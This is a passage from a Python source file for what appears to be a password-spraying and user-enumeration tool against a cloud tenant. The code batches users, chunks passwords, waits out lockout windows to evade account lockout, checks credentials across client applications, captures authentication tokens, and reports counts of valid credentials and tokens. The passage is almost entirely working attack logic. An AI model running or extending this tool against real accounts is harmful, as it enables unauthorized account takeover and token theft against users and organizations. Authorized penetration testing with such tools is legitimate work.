                future = executor.submit(
                    process_attempt,
                    target,
                    apim_manager,
                    args.tenant,
                    client_apps,
                    pace_config,
                    logger,
                    locked_users_set,
                    invalid_users_set,
                    lockout_counts,
                    lock,
                    args.continue_on_success,
                    stop_event,
                )
                futures.append(future)
                
            for f in as_completed(futures):
                try:
                    f.result()
                except Exception as e:
                    print_error(f"Worker error: {e}")

    def run_enum(target_list):
        if stop_event.is_set():
            return
        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = []
            for target in target_list:
                if stop_event.is_set():
                    break
                futures.append(executor.submit(
                    process_enum,
                    target,
                    apim_manager,
                    pace_config,
                    logger,
                    existing_users_set,
                    throttle_flag,
                    lock,
                    stop_event,
                ))
            for f in as_completed(futures):
                try:
                    f.result()
                except Exception as e:
                    print_error(f"Worker error: {e}")

    if args.mode == "validate-users":
        if not users:
            print_error("validate-users mode requires --users")
            sys.exit(1)
        run_enum([Target(u) for u in users])
        _print_enum_summary(logger, users, existing_users_set)
        _finalize_manifest(logger, manifest)
        return
    elif args.mode == "validate-clients":
        if not users or not passwords:
            print_error("validate-clients mode requires --users and --passwords")
            sys.exit(1)
        if len(users) != len(passwords):
            print_error("validate-clients mode requires equal number of users and passwords (1:1 mapping)")
            sys.exit(1)
        # Expand every credential pair across every client app so the existing
        # per-attempt logic (lockout, token capture, logging) is reused as-is.
        expanded = [
            Target(u, p, client_app=app)
            for u, p in zip(users, passwords)
            for app in client_apps
        ]
        run_assessment(expanded)
    elif args.mode == "validate":
        run_assessment(targets)
    elif args.mode == "spray":
        if not users or not passwords:
            print_error("Spray mode requires --users and --passwords")
            sys.exit(1)
        
        # Parse user batch delay range
        batch_delay_min = 5
        batch_delay_max = 5
        if "-" in args.user_batch_delay:
            try:
                parts = args.user_batch_delay.split("-")
                batch_delay_min = int(parts[0])
                batch_delay_max = int(parts[1])
            except ValueError:
                print_error(f"Invalid format for --user-batch-delay: {args.user_batch_delay}. Using default 5.")
        else:
            try:
                batch_delay_min = int(args.user_batch_delay)
                batch_delay_max = batch_delay_min
            except ValueError:
                print_error(f"Invalid format for --user-batch-delay: {args.user_batch_delay}. Using default 5.")

        # Spray Mode with Chunks
        pass_chunk_size = pace_config["count"]
        pass_chunks = [passwords[i:i + pass_chunk_size] for i in range(0, len(passwords), pass_chunk_size)]
        
        for i, chunk in enumerate(pass_chunks):
            if stop_event.is_set():
                break
            
            if sys.stdout.isatty():
                print("\033[2K\r", end="", flush=True)
            print_info(f"Spraying password chunk {i+1}/{len(pass_chunks)}: {', '.join(chunk)}")
            for password in chunk:
                if stop_event.is_set():
                    break
                
                # Check safe threshold
                with lock:
                    if len(locked_users_set) >= pace_config["safe"]:
                        print_error(f"Safe threshold reached ({pace_config['safe']} lockouts). Terminating.")
                        _print_summary(logger, locked_users_set, invalid_users_set)
                        sys.exit(1)

                valid_users = [u for u in users if u not in locked_users_set and u not in invalid_users_set]

                if args.user_batch_size > 0:
                    user_chunk_size = args.user_batch_size
                    user_chunks = [valid_users[j:j + user_chunk_size] for j in range(0, len(valid_users), user_chunk_size)]
                    
                    for u_idx, u_chunk in enumerate(user_chunks):
                        if stop_event.is_set():
                            break
                        
                        print_info(f"  -> Spraying user batch {u_idx+1}/{len(user_chunks)} ({len(u_chunk)} users)")
                        current_targets = [Target(u, password) for u in u_chunk]
                        run_assessment(current_targets)
                        
                        # Wait between user batches, except after the last batch
                        if u_idx < len(user_chunks) - 1 and not stop_event.is_set():
                            delay_mins = random.randint(batch_delay_min, batch_delay_max)
                            print_info(f"Waiting {delay_mins} minutes before next user batch...")
                            wait_with_countdown(delay_mins * 60, allow_skip=True)
                else:
                    current_targets = [Target(u, password) for u in valid_users]
                    run_assessment(current_targets)
                
                if stop_event.is_set():
                    break
            
            # Lockout wait between password chunks
            if i < len(pass_chunks) - 1:
                lockout_wait = pace_config["lockout"]
                if stop_event.is_set():
                    break
                print_info(f"Waiting {lockout_wait} minutes for lockout reset... (Hit Enter to skip)")
                wait_with_countdown(lockout_wait * 60, allow_skip=True)

    _print_summary(logger, locked_users_set, invalid_users_set)
    _finalize_manifest(logger, manifest)

def _finalize_manifest(logger, manifest):
    manifest["finished"] = utc_now_str()
    manifest["total_attempts"] = len(_read_results(logger))
    manifest["tokens_captured"] = (
        sum(1 for _ in open(logger.tokens_file)) if logger.tokens_file.exists() else 0
    )
    logger.write_manifest(manifest)

def _read_results(logger):
    rows = []
    if logger.results_file.exists():
        with open(logger.results_file, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    rows.append(json.loads(line))
                except json.JSONDecodeError:
                    continue
    return rows

def _print_summary(logger, locked_users, invalid_users):
    print("\n" + style("--- Assessment Summary ---", TermColors.BOLD, TermColors.CYAN))
    rows = _read_results(logger)

    def _class(r):
        return str(r.get("classification", ""))

    valid_count = sum(1 for r in rows if _class(r).startswith("VALID"))
    blocked_count = sum(1 for r in rows if _class(r).startswith(("BLOCKED", "LOCKED")))
    failed_count = sum(1 for r in rows if _class(r).startswith("FAILED"))

    token_count = 0
    if logger.tokens_file.exists():
        token_count = sum(1 for _ in open(logger.tokens_file))

    print(f"Valid Credentials:   {style(str(valid_count), TermColors.GREEN, TermColors.BOLD)}")
    print(f"Tokens Captured:     {style(str(token_count), TermColors.GREEN, TermColors.BOLD)}")
    print(f"Locked/Blocked:      {style(str(blocked_count), TermColors.YELLOW, TermColors.BOLD)}")
    print(f"Failed Attempts:     {style(str(failed_count), TermColors.RED)}")
    print(f"Locked Users:        {len(locked_users)}")
    print(f"Invalid Users:       {len(invalid_users)}")
    print(f"Results Directory:   {style(str(logger.run_dir), TermColors.CYAN, TermColors.BOLD)}")
    print(style("--------------------------", TermColors.BOLD, TermColors.CYAN))

def _print_enum_summary(logger, users, existing_users):
    print("\n" + style("--- User Enumeration Summary ---", TermColors.BOLD, TermColors.CYAN))
    existing_count = len(existing_users)
    total = len(users)
    print(f"Existing Users:      {style(str(existing_count), TermColors.GREEN, TermColors.BOLD)}")
    print(f"Not Found/Unknown:   {style(str(total - existing_count), TermColors.RED)}")
    print(f"Total Tested:        {total}")
    print(f"Results Directory:   {style(str(logger.run_dir), TermColors.CYAN, TermColors.BOLD)}")
    print(style("--------------------------------", TermColors.BOLD, TermColors.CYAN))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_error("Interrupted by user")
        sys.exit(1)
